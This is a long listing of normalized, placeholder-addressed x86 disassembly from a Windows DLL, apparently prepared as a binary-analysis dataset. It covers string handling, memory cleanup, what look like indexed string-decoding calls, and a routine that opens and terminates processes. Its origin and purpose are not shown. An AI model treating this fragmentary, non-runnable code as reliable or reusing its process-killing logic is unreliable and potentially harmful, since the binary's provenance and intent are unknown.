mov esp ebp
pop ebp
retn 0x4
push [ esp + 0xbc ]
call j_sub_1003f3e3#2
add esp 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x44 ] 0x0
mov [ esp + 0x48 ] 0x0
mov ecx esi
call sub_10014980
add esi 0x68
cmp esi edi
jne r-xdata
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x18 ] eax
jne r-xdata
mov ecx 0x43
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov esi [ esp + 0x40 ]
mov eax [ rw-data ]
mov [ esp + 0xe4 ] 0x0
mov [ esp + 0xe8 ] 0x0
mov [ esp + 0xe8 ] 0xf
mov [ esp + 0xe4 ] 0x0
mov [ esp + 0xd4 ] 0x0
cmp [ esi ] 0x0
mov [ esp + 0x30 ] eax
jne r-xdata
mov ecx 0x44
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov ecx esi
lea edx [ ecx + 0x1 ]
nop
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push esi
lea ecx [ esp + 0xdc ]
call sub_100019e0
mov [ esp + 0x1a90 ] 0x11
lea ecx [ esp + 0xd4 ]
mov esi [ esp + 0x14 ]
push 0xffffffff
push 0x0
lea eax [ esi - 0x54 ]
push eax
call sub_100050b0
push 0x1
push r--data
lea ecx [ esp + 0xdc ]
call sub_10005470
cmp [ esi - 0x2c ] 0x0
jbe r-xdata
mov esi [ esp + 0x30 ]
cmp [ esi ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx esi
lea edx [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov esi [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx 0x1a
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push esi
lea ecx [ esp + 0xdc ]
call sub_10005470
mov esi [ esp + 0x38 ]
cmp [ esi ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ esi ] 0x0
mov [ esp + 0x34 ] eax
jne r-xdata
mov ecx 0x1b
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov ecx esi
lea edx [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov ecx esi
lea edx [ ecx + 0x1 ]
nop
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push esi
lea ecx [ esp + 0xdc ]
call sub_10005470
mov esi [ esp + 0x14 ]
cmp [ esi - 0x8 ] 0x10
jb r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push esi
lea ecx [ esp + 0xdc ]
call sub_10005470
sub esp 0x18
xor eax eax
mov ecx esp
mov [ esp + 0x3c ] esp
push 0xffffffff
push eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] ax
mov eax [ esp + 0x34 ]
add eax 0xffffffc4
push eax
call sub_10003a20
mov [ esp + 0x1aa8 ] 0x12
mov [ esp + 0x1aa8 ] 0x11
lea ecx [ esp + 0x17c ]
call sub_1003c1b0
add esp 0x18
mov [ esp + 0x1a90 ] 0x13
lea ecx [ esp + 0xd4 ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ esp + 0x1a90 ] 0x11
cmp [ esp + 0x178 ] 0x10
jb r-xdata
lea eax [ esi - 0x1c ]
mov eax [ esi - 0x1c ]
jmp r-xdata
mov esi [ esp + 0x34 ]
mov [ esp + 0x178 ] 0xf
mov [ esp + 0x174 ] 0x0
mov [ esp + 0x164 ] 0x0
cmp [ esi ] 0x0
jne r-xdata
push [ esp + 0x164 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0x1a8 ] 0xf
mov [ esp + 0x1a4 ] 0x0
mov [ esp + 0x194 ] 0x0
mov [ esp + 0x1a90 ] 0x11
cmp [ esp + 0x100 ] 0x10
jb r-xdata
push [ esp + 0x194 ]
call j_sub_1003f3e3#2
add esp 0x4
push [ esi - 0xc ]
mov [ esp + 0x100 ] 0x0
lea ecx [ esp + 0xf0 ]
mov [ esp + 0x104 ] 0x0
push eax
mov [ esp + 0x108 ] 0xf
mov [ esp + 0x104 ] 0x0
mov [ esp + 0xf4 ] 0x0
call sub_100019e0
mov [ esp + 0x1a90 ] 0x14
lea edx [ esp + 0xec ]
lea ecx [ esp + 0x194 ]
call sub_1003b670
mov [ esp + 0x1a90 ] 0x15
lea ecx [ esp + 0xd4 ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ esp + 0x1a90 ] 0x14
cmp [ esp + 0x1a8 ] 0x10
jb r-xdata
mov ecx esi
lea edx [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov ecx [ esi ]
mov eax 0x2aaaaaab
sub ecx [ esi - 0x4 ]
imul ecx
mov [ esp + 0x100 ] 0xf
sar edx 0x2
mov eax edx
mov [ esp + 0xfc ] 0x0
shr eax 0x1f
mov [ esp + 0xec ] 0x0
add eax edx
je r-xdata
push [ esp + 0xec ]
call j_sub_1003f3e3#2
add esp 0x4
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push esi
lea ecx [ esp + 0xdc ]
call sub_10005470
mov ecx [ esi + 0xc ]
mov eax 0x2aaaaaab
sub ecx [ esi + 0x8 ]
imul ecx
sar edx 0x2
mov eax edx
shr eax 0x1f
add eax edx
je r-xdata
cmp [ edi ] 0x0
jne r-xdata
push 0xffffffff
push 0x0
lea eax [ esp + 0xdc ]
push eax
lea ecx [ esp + 0xc8 ]
call sub_100050b0
cmp [ edi ] 0x0
jne r-xdata
cmp [ edi ] 0x0
jne r-xdata
mov ecx edi
lea edx [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov ecx edi
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov ecx edi
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push edi
lea ecx [ esp + 0xdc ]
call sub_10005470
mov esi [ esp + 0x3c ]
cmp [ esi ] 0x0
jne r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push edi
lea ecx [ esp + 0xc4 ]
call sub_10005470
mov [ esp + 0x1a90 ] 0x10
cmp [ esp + 0xe8 ] 0x10
jb r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push edi
lea ecx [ esp + 0xdc ]
call sub_10005470
mov esi [ esp + 0x2c ]
cmp [ esi ] 0x0
jne r-xdata
mov ecx esi
lea edx [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
add esi 0x68
mov [ esp + 0xe8 ] 0xf
mov [ esp + 0xe4 ] 0x0
mov [ esp + 0xd4 ] 0x0
mov [ esp + 0x14 ] esi
lea eax [ esi - 0x54 ]
cmp eax ebx
jne r-xdata
push [ esp + 0xd4 ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx esi
lea edx [ ecx + 0x1 ]
mov edi edi
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push esi
lea ecx [ esp + 0xdc ]
call sub_10005470
cmp [ edi ] 0x0
jne r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push esi
lea ecx [ esp + 0xdc ]
call sub_10005470
cmp [ edi ] 0x0
jne r-xdata
mov ecx edi
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov ecx edi
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push edi
lea ecx [ esp + 0xdc ]
call sub_10005470
mov eax [ esp + 0x14 ]
mov edi [ eax ]
mov esi [ eax - 0x4 ]
cmp esi edi
je r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push edi
lea ecx [ esp + 0xdc ]
call sub_10005470
mov eax [ esp + 0x14 ]
mov edi [ eax + 0xc ]
mov esi [ eax + 0x8 ]
cmp esi edi
je r-xdata
mov esi [ esp + 0x14 ]
mov edi [ esp + 0x1c ]
mov ebx [ esp + 0x1c ]
lea ecx [ ecx ]
mov esi [ esp + 0x14 ]
mov edi [ esp + 0x1c ]
mov ebx [ esp + 0x1c ]
mov edi edi
mov ecx eax
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov ecx eax
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
mov eax [ esp + 0x18 ]
sub ecx edx
push ecx
push eax
lea ecx [ esp + 0xdc ]
call sub_10005470
push 0xffffffff
push 0x0
push esi
lea ecx [ esp + 0xe0 ]
call sub_100050b0
cmp [ ebx ] 0x0
jne r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
mov eax [ esp + 0x18 ]
sub ecx edx
push ecx
push eax
lea ecx [ esp + 0xdc ]
call sub_10005470
push 0xffffffff
push 0x0
push esi
lea ecx [ esp + 0xe0 ]
call sub_100050b0
cmp [ ebx ] 0x0
jne r-xdata
mov ecx ebx
lea edx [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov ecx ebx
lea edx [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push ebx
lea ecx [ esp + 0xdc ]
call sub_10005470
add esi 0x18
cmp esi edi
jne r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push ebx
lea ecx [ esp + 0xdc ]
call sub_10005470
add esi 0x18
cmp esi edi
jne r-xdata
mov eax [ esp + 0x18 ]
cmp [ eax ] 0x0
jne r-xdata
mov ebx [ esp + 0x28 ]
mov eax [ esp + 0x18 ]
cmp [ eax ] 0x0
jne r-xdata
mov ebx [ esp + 0x28 ]
sub_10014910
push esi
push edi
mov edi ecx
mov esi [ edi ]
test esi esi
je r-xdata
pop edi
pop esi
retn
push ebx
mov ebx [ edi + 0x4 ]
cmp esi ebx
je r-xdata
push [ edi ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ edi ] 0x0
mov [ edi + 0x4 ] 0x0
mov [ edi + 0x8 ] 0x0
pop ebx
mov ecx esi
call sub_10014980
add esi 0x68
cmp esi ebx
jne r-xdata
sub_10014980
push ebp
mov ebp esp
push 0xffffffff
push sub_1004dd94
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x3
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ esi + 0x50 ]
test eax eax
je r-xdata
push [ esi + 0x60 ]
push eax
call sub_10004c10
push [ esi + 0x5c ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x5c ] 0x0
mov [ esi + 0x60 ] 0x0
mov [ esi + 0x64 ] 0x0
mov [ ebp - 0x4 ] 0x1
cmp [ esi + 0x4c ] 0x10
jb r-xdata
push [ esi + 0x54 ]
push eax
call sub_10004c10
push [ esi + 0x50 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x50 ] 0x0
mov [ esi + 0x54 ] 0x0
mov [ esi + 0x58 ] 0x0
mov [ esi + 0x4c ] 0xf
mov [ esi + 0x48 ] 0x0
mov [ esi + 0x38 ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x2c ] 0x8
jb r-xdata
push [ esi + 0x38 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x2c ] 0x7
xor eax eax
mov [ esi + 0x28 ] 0x0
mov [ esi + 0x18 ] ax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push [ esi + 0x18 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10014aa0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004de0b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x800
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x7f8 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x810 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov [ esp + 0x24 ] ebx
cmp [ rw-data ] 0x0
mov edi [ InterlockedExchange@IAT ]
jne r-xdata
mov eax [ rw-data ]
mov [ esp + 0x5c ] 0x0
mov [ esp + 0x60 ] 0x0
mov [ esp + 0x44 ] eax
mov [ esp + 0x60 ] 0xf
mov [ esp + 0x5c ] 0x0
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x818 ] 0x0
cmp [ ebx - 0x28 ] 0x0
je r-xdata
mov ecx 0x14
call sub_100382c0
push eax
push rw-data
call edi
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x818 ] 0x2
lea edx [ esp + 0x10 ]
lea ecx [ esp + 0x14 ]
call sub_10015b60
test eax eax
jne r-xdata
mov [ esp + 0x74 ] 0x0
mov [ esp + 0x78 ] 0x0
mov [ esp + 0x78 ] 0xf
mov [ esp + 0x74 ] 0x0
mov [ esp + 0x64 ] 0x0
mov [ esp + 0x818 ] 0x1
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x68 ]
push eax
push [ ebx - 0x28 ]
call sub_10015110
test eax eax
jne r-xdata
mov ecx [ esp + 0x18 ]
mov eax 0x30c30c31
mov esi [ esp + 0x14 ]
xor ebx ebx
sub ecx esi
mov [ esp + 0x20 ] ebx
imul ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov [ esp + 0x28 ] eax
je r-xdata
mov eax [ ebx - 0x2c ]
lea ecx [ ebx - 0x2c ]
push [ esp + 0x10 ]
mov eax [ eax + 0xc ]
add ecx eax
call sub_10007da0
mov esi eax
mov [ esp + 0x818 ] 0x0
lea ecx [ esp + 0x14 ]
call sub_10015350
jmp r-xdata
push 0xffffffff
push 0x0
lea eax [ esp + 0x6c ]
push eax
lea ecx [ esp + 0x58 ]
call sub_100018b0
mov [ esp + 0x818 ] 0x0
cmp [ esp + 0x78 ] 0x10
jb r-xdata
mov eax [ ebx - 0x2c ]
lea ecx [ ebx - 0x2c ]
push [ esp + 0x10 ]
mov eax [ eax + 0xc ]
add ecx eax
call sub_10007da0
mov esi eax
mov [ esp + 0x818 ] 0x0
cmp [ esp + 0x78 ] 0x10
jb r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov ebx [ esp + 0x24 ]
lea edi [ esi + 0x4 ]
mov edi edi
mov [ esp + 0x818 ] 0xffffffff
cmp [ esp + 0x60 ] 0x10
jb r-xdata
mov [ esp + 0x78 ] 0xf
mov [ esp + 0x74 ] 0x0
mov [ esp + 0x64 ] 0x0
jmp r-xdata
push [ esp + 0x64 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0x78 ] 0xf
mov [ esp + 0x74 ] 0x0
mov [ esp + 0x64 ] 0x0
jmp r-xdata
push [ esp + 0x64 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ rw-data ]
push ebx
push eax
lea eax [ esp + 0xb4 ]
push eax
call sub_100153a0
add esp 0xc
cmp [ esp + 0xac ] 0x0
jne r-xdata
mov ecx 0x47
call sub_100382c0
push eax
push rw-data
call edi
lea ecx [ ebx - 0x24 ]
mov ecx [ ebx - 0x24 ]
jmp r-xdata
mov [ esp + 0x60 ] 0xf
mov eax esi
mov [ esp + 0x5c ] 0x0
mov [ esp + 0x4c ] 0x0
mov ecx [ esp + 0x810 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x7f8 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
push [ esp + 0x4c ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x94
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ esp + 0x48 ] esi
mov [ esp + 0x818 ] 0x6
test esi esi
je r-xdata
lea ecx [ esp + 0xac ]
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
xor edi edi
mov eax [ ebx - 0x2c ]
mov ecx [ eax + 0x8 ]
add ecx 0xffffffd4
add ecx ebx
push ecx
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
push edx
push eax
mov ecx esi
call sub_10018c90
mov edi eax
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ esp + 0xb0 ]
push eax
lea ecx [ esp + 0x54 ]
call sub_10005470
mov [ esp + 0x818 ] 0x0
mov ebx [ esp + 0x14 ]
test ebx ebx
je r-xdata
add edi 0x54
dec [ esp + 0x28 ]
jne r-xdata
inc [ esp + 0x20 ]
cmp [ rw-data ] eax
jne r-xdata
push ecx
push eax
call sub_1003d023
add esp 0x8
test eax eax
jne r-xdata
mov [ esp + 0x818 ] 0x0
cmp [ esp + 0x40 ] 0x10
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
mov [ esp + 0x818 ] 0x0
lea eax [ esp + 0x4c ]
push 0xffffffff
push 0x0
mov [ esp + 0x44 ] 0x0
lea ecx [ esp + 0x34 ]
mov [ esp + 0x48 ] 0x0
push eax
mov [ esp + 0x4c ] 0xf
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x38 ] 0x0
call sub_100018b0
mov [ esp + 0x818 ] 0x7
lea ecx [ edi + 0x34 ]
lea eax [ esp + 0x2c ]
cmp ecx eax
je r-xdata
mov ebx [ esp + 0x24 ]
mov edi [ esp + 0x18 ]
mov esi ebx
cmp ebx edi
je r-xdata
cmp [ ebx - 0x10 ] 0x8
jb r-xdata
mov edi [ InterlockedExchange@IAT ]
mov ebx [ esp + 0x20 ]
mov esi [ InterlockedExchange@IAT ]
lea ecx [ eax + 0x45 ]
call sub_100382c0
mov esi [ InterlockedExchange@IAT ]
push eax
push rw-data
call esi
jmp r-xdata
mov [ esp + 0x40 ] 0xf
mov [ esp + 0x3c ] 0x0
mov [ esp + 0x2c ] 0x0
test edi edi
jne r-xdata
push [ esp + 0x2c ]
call j_sub_1003f3e3#2
add esp 0x4
push ebx
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x1c ] 0x0
mov ecx esi
call sub_100153c0
add esi 0x54
cmp esi edi
jne r-xdata
lea ecx [ esp + 0xac ]
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov eax [ rw-data ]
push [ edi - 0x4 ]
push eax
lea eax [ esp + 0xb4 ]
push eax
call sub_100153a0
add esp 0xc
cmp [ esp + 0xac ] 0x0
jne r-xdata
mov eax [ edi ]
mov esi [ eax + 0x8 ]
add esi edi
xor esi esi
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ esp + 0xb0 ]
push eax
lea ecx [ esp + 0x54 ]
call sub_10005470
mov [ esp + 0x8c ] 0x0
mov [ esp + 0x90 ] 0x0
mov [ esp + 0x90 ] 0xf
mov [ esp + 0x8c ] 0x0
mov [ esp + 0x7c ] 0x0
mov [ esp + 0x818 ] 0x3
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x80 ]
push eax
push [ edi - 0x4 ]
call sub_10015110
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push 0xffffffff
push 0x0
lea eax [ esp + 0x84 ]
push eax
lea ecx [ esp + 0x58 ]
call sub_100050b0
jmp r-xdata
mov eax [ rw-data ]
mov esi [ esp + 0x10 ]
push esi
push eax
lea eax [ esp + 0xb4 ]
push eax
call sub_100153a0
add esp 0xc
cmp [ esp + 0xac ] 0x0
jne r-xdata
mov ecx 0x46
call sub_100382c0
push eax
push rw-data
call esi
mov esi [ esp + 0x44 ]
cmp [ esi ] 0x0
jne r-xdata
lea ecx [ esp + 0xac ]
lea edx [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov ecx esi
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ esp + 0xb0 ]
push eax
lea ecx [ esp + 0x54 ]
call sub_10005470
sub esp 0x18
mov eax esp
mov [ esp + 0x60 ] esp
push 0x1
push esi
push eax
call sub_10007990
mov [ esp + 0x830 ] 0x4
mov [ esp + 0x830 ] 0x3
lea ecx [ esp + 0xac ]
call sub_1003c1b0
add esp 0x18
mov [ esp + 0x818 ] 0x5
lea ecx [ esp + 0x4c ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ esp + 0x818 ] 0x3
cmp [ esp + 0xa8 ] 0x10
jb r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push esi
lea ecx [ esp + 0x54 ]
call sub_10005470
mov [ esp + 0x818 ] 0x2
cmp [ esp + 0x90 ] 0x10
jb r-xdata
mov [ esp + 0xa8 ] 0xf
mov [ esp + 0xa4 ] 0x0
mov [ esp + 0x94 ] 0x0
push [ esp + 0x94 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0x90 ] 0xf
mov [ esp + 0x8c ] 0x0
mov [ esp + 0x7c ] 0x0
push [ esp + 0x7c ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10015110
push ebp
mov ebp esp
push 0xffffffff
push sub_1004de48
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
push ebx
push 0x0
push 0x1
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] 0x0
call [ OpenProcess@IAT ]
mov edi eax
test edi edi
jne r-xdata
push ebx
push 0x0
push 0x100001
call [ OpenProcess@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
call [ GetLastError@IAT ]
mov [ esi ] eax
xor eax eax
jmp r-xdata
push 0x0
push edi
call [ TerminateProcess@IAT ]
test eax eax
jne r-xdata
push edi
call [ CloseHandle@IAT ]
mov edi ebx
mov [ ebp - 0x30 ] 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov esi [ InterlockedExchange@IAT ]
jne r-xdata
call [ GetLastError@IAT ]
mov [ esi ] eax
mov eax [ CloseHandle@IAT ]
push edi
call eax
xor eax eax
jmp r-xdata
cmp [ ebp - 0x30 ] 0x0
mov ebx [ rw-data ]
je r-xdata
mov ecx 0x27
call sub_100382c0
push eax
push rw-data
call esi
cmp [ rw-data ] 0x0
jne r-xdata
push 0x13bd
push edi
call [ WaitForSingleObject@IAT ]
test eax eax
jne r-xdata
mov esi [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
mov ecx 0x4a
call sub_100382c0
push eax
push rw-data
call esi
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] eax
jne r-xdata
mov ecx ebx
lea edx [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov eax [ rw-data ]
lea ecx [ ebp - 0x2c ]
push eax
call sub_10005430
jmp r-xdata
mov ecx 0x49
call sub_100382c0
push eax
push rw-data
call esi
mov esi [ rw-data ]
lea ecx [ ebp - 0x2c ]
push ebx
call sub_10005430
push esi
lea ecx [ ebp - 0x2c ]
call sub_10005430
jmp r-xdata
lea ecx [ eax + 0x48 ]
call sub_100382c0
push eax
push rw-data
call esi
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005470
cmp [ esi ] 0x0
jne r-xdata
mov eax [ CloseHandle@IAT ]
push edi
call eax
mov eax [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
cmp eax ecx
je r-xdata
mov ecx esi
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push 0xffffffff
push 0x0
push ecx
mov ecx eax
call sub_100018b0
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push esi
lea ecx [ ebp - 0x2c ]
call sub_10005470
mov [ ebp - 0x18 ] 0xf
mov eax 0x1
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
push [ ebp - 0x2c ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10015350
push esi
push edi
mov edi ecx
mov esi [ edi ]
test esi esi
je r-xdata
pop edi
pop esi
retn
push ebx
mov ebx [ edi + 0x4 ]
cmp esi ebx
je r-xdata
push [ edi ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ edi ] 0x0
mov [ edi + 0x4 ] 0x0
mov [ edi + 0x8 ] 0x0
pop ebx
mov ecx esi
call sub_100153c0
add esi 0x54
cmp esi ebx
jne r-xdata
sub_100153c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004de91
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ esi + 0x48 ] 0x8
jb r-xdata
xor eax eax
mov [ esi + 0x48 ] 0x7
mov [ esi + 0x44 ] 0x0
mov [ esi + 0x34 ] ax
mov [ ebp - 0x4 ] al
cmp [ esi + 0x30 ] 0x8
jb r-xdata
push [ esi + 0x34 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x30 ] 0x7
xor eax eax
mov [ esi + 0x2c ] 0x0
mov [ esi + 0x1c ] ax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi + 0x18 ] 0x8
jb r-xdata
push [ esi + 0x1c ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ esi + 0x18 ] 0x7
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi + 0x4 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_100154a0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004df21
mov eax [ fs : 0x0 ]
push eax
sub esp 0x650
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x648 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x660 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov [ esp + 0x48 ] ebx
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x668 ] 0x0
lea edx [ esp + 0x14 ]
lea ecx [ esp + 0x18 ]
mov [ esp + 0x14 ] 0x0
call sub_10015b60
test eax eax
jne r-xdata
mov ecx [ esp + 0x1c ]
mov eax 0x30c30c31
sub ecx [ esp + 0x18 ]
imul ecx
mov ecx [ esp + 0x18 ]
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov edx [ esp + 0x1c ]
push sub_10015480
push eax
mov [ esp + 0x30 ] eax
call sub_10016600
mov edi [ InterlockedExchange@IAT ]
add esp 0x8
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebx - 0x10 ]
lea ecx [ ebx - 0x10 ]
push [ esp + 0x14 ]
mov eax [ eax + 0xc ]
add ecx eax
call sub_10007da0
mov edi eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ esp + 0x24 ] eax
jne r-xdata
mov ecx 0x4b
call sub_100382c0
push eax
push rw-data
call edi
mov [ esp + 0x668 ] 0xffffffff
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov esi [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx 0x15
call sub_100382c0
